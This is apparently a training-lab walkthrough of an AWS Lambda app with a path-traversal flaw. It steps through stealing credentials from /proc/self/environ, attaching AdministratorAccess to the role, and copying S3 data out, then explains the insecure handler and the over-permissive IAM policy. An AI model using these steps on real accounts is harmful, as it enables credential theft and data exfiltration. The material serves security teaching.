# Dunder Mifflen Products Exploit Walkthrough

This webpage is backed by API Gateway and Lambda. When a request is made the API forwards the request to lambda which in turns serves the content.

Accessing Certain Files may be Important for application use.

However, not all files should be publicly accessible.

---

### Discovery:

Right-click on the web page, and select "Inspect" or "Inspect Element" from the context menu. This will open the browser's developer tools.

- Click on the Network tab, in the inspector tools window. 
- Click hint.txt again to re-issue the request from the Web UI.
- Expand the 200 status GET method event.
- Discover the backend API Gateway Endpoint URL.

![lambda](/images/products/lambda.jpg)

The format should be: https://something.execute-api.us-east-1.amazonaws.com/dev/lambda

---

### Gain Entry:
Try appending the following to the end of the current URL.
- ?file=/proc/self/environ

![envs](/images/products/envs.jpg)

---

### Assume Exposed Lambda Role

Exporting the AWS credentials
```
export AWS_ACCESS_KEY_ID=<>; export AWS_SECRET_ACCESS_KEY=<>; export AWS_SESSION_TOKEN=<>
```

Gather the value of the IAM Role ARN 
```
aws sts get-caller-identity --query 'Arn'
```

---

### IAM Privilege Escalation

Attach a IAM policy to our IAM Role to gain additional permissions
```
aws iam attach-role-policy --role-name <name of role> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```


![assume](/images/products/gather.jpg)

---

### Service Enumeration

List AWS S3 buckets
```
aws s3 ls
```

List objects inside of S3
```
aws s3 ls s3://<Name of bucket>
```

---

### Data Exfiltration

Copy out S3 object
```
aws s3 cp s3://<name of bucket>/<file name and extension>
```

![exfil](/images/products/exfil.jpg)

---

## Explanations 

---

### Insufficient Input Validation:

Here is the underlying code running on Lambda.

```
def handler(event, context):
    print("EVENT: %s" % (event,))
    content = ""

    if event.get("queryStringParameters") and 'file' in event["queryStringParameters"]:
        filename = event["queryStringParameters"]['file'] #file input is not validated here.
        try:
            with open(filename, 'r') as f: # opening up unvalidated file
                content = f.read()
                content = content.replace('\0', '\n')
        except BaseException:
            return _403()

    BODY = """<!DOCTYPE html>
<html>
<body>
<pre>%s</pre>
</body>
</html>""" % content

    return {
        'statusCode': 200,
        'headers': {
            'Content-Type': 'text/html; charset=utf8',
            'Access-Control-Allow-Origin' : '*'
        },
        'isBase64Encoded': False,
        'body': BODY,
    }

```

---

Let's break down the issues:

```
filename = event["queryStringParameters"]['file']
```

Security Concern: The code directly uses the filename extracted from the query parameters without proper validation. This can be a security risk as it may allow for directory traversal attacks, where an attacker manipulates the file parameter to access files outside the intended directory.


```
with open(filename, 'r') as f:
```
Security Concern: Opening a file without proper validation may expose sensitive system files if an attacker can control the filename. This could lead to directory traversal vulnerabilities.

---

### Insufficient Implementation of Least Privilege Permissions

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Action": [
                "cloudwatch:PutMetricData"
            ],
            "Resource": "*", "*", ## Excessive Star
            "Effect": "Allow"
        },
        {
            "Action": [
                "logs:CreateLogGroup",
                "logs:CreateLogStream",
                "logs:PutLogEvents",
                "iam:ListAttachedRolePolicies",
                "iam:AttachRolePolicy" ## Excessive permission
            ],
            "Resource": "*", ## Excessive Star
            "Effect": "Allow"
        }
    ]
}
```
---

Let's break down the issues:

**Excessive Use of * (Wildcard)**:
    In both statements, the Resource field is set to "*" (wildcard), allowing actions on all resources. This is a broad permission that goes against the principle of least privilege.
    Issue: This approach grants more permissions than necessary and could potentially lead to unintended consequences, such as allowing actions on resources that the role shouldn't have access to.

**Excessive Permissions in the Second Statement**:
    The second statement includes actions like "iam:ListAttachedRolePolicies" and "iam:AttachRolePolicy". These actions provide the capability to list attached policies and attach policies to IAM roles.
    Issue: Granting these IAM actions is excessive unless the role explicitly needs to manage IAM policies. This introduces the risk of IAM privilege escalation, where a user with this role can potentially attach policies with higher privileges, leading to a broader set of permissions than intended.